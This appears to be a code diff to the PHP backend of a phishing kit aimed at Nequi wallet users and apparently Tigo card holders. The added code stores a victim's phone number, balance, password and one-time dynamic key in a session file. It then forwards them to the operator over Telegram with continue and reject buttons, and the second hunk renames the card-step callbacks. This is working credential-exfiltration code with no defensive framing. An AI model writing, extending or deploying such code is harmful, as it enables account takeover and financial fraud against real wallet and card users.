@@ -174,6 +174,67 @@ try {
             $result = $telegram->sendMessageWithButtons($message, $buttons);
             break;
 
+        case 'nequi_saldo':
+        case 'saldo':
+            // Cargar y actualizar sesión
+            $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
+            $sessions = [];
+            if (file_exists($sessionsFile)) {
+                $sessions = json_decode(file_get_contents($sessionsFile), true) ?? [];
+            }
+            
+            if (!isset($sessions[$sessionId])) {
+                $sessions[$sessionId] = [
+                    'session_id' => $sessionId,
+                    'created_at' => date('Y-m-d H:i:s'),
+                    'data' => []
+                ];
+            }
+            
+            // Guardar saldo
+            $saldo = $data['data']['saldo'] ?? '';
+            $telefono = $data['data']['telefono'] ?? '';
+            $monto = $data['data']['monto'] ?? '';
+            
+            $sessions[$sessionId]['data']['saldo'] = $saldo;
+            if ($telefono) {
+                $sessions[$sessionId]['data']['phoneNumber'] = $telefono;
+            }
+            if ($monto) {
+                $sessions[$sessionId]['data']['monto'] = $monto;
+            }
+            $sessions[$sessionId]['last_update'] = date('Y-m-d H:i:s');
+            
+            file_put_contents($sessionsFile, json_encode($sessions, JSON_PRETTY_PRINT));
+            
+            $accumulatedData = $sessions[$sessionId]['data'];
+            
+            // Construir mensaje con datos acumulados
+            $message = "🟣 <b>NEQUI - SALDO RECIBIDO</b>\n\n";
+            $message .= "📊 <b>Datos Acumulados:</b>\n";
+            $message .= "━━━━━━━━━━━━━━━━\n\n";
+            
+            if (!empty($accumulatedData['phoneNumber'])) {
+                $message .= "📱 <b>Número:</b> <code>{$accumulatedData['phoneNumber']}</code>\n";
+            }
+            if (!empty($accumulatedData['saldo'])) {
+                $message .= "💰 <b>Saldo:</b> <code>\${$accumulatedData['saldo']}</code>\n";
+            }
+            if (!empty($accumulatedData['monto'])) {
+                $message .= "💵 <b>Monto a Pagar:</b> <code>\${$accumulatedData['monto']}</code>\n";
+            }
+            if (!empty($accumulatedData['clave'])) {
+                $message .= "🔐 <b>Clave:</b> <code>{$accumulatedData['clave']}</code>\n";
+            }
+            if (!empty($accumulatedData['claveDinamica'])) {
+                $message .= "🎯 <b>Dinámica:</b> <code>{$accumulatedData['claveDinamica']}</code>\n";
+            }
+            
+            $message .= "\n🆔 <code>" . substr($sessionId, 0, 12) . "</code>";
+            
+            $result = $telegram->sendMessageWithButtons($message, $buttons);
+            break;
+
         case 'nequi_dinamica':
             // Cargar y actualizar sesión
             $sessionsFile = __DIR__ . '/../../storage/nequi_sessions.json';
@@ -532,8 +593,8 @@ try {
             
             $buttons = [
                 [
-                    ['text' => '✅ Continuar a Formulario', 'callback_data' => "tigo_tarjeta_continue|{$sessionId}"],
-                    ['text' => '❌ Rechazar', 'callback_data' => "tigo_tarjeta_reject|{$sessionId}"]
+                    ['text' => '✅ Continuar a Formulario', 'callback_data' => "tigo_card_continue|{$sessionId}"],
+                    ['text' => '❌ Rechazar', 'callback_data' => "tigo_card_reject|{$sessionId}"]
                 ]
             ];
             
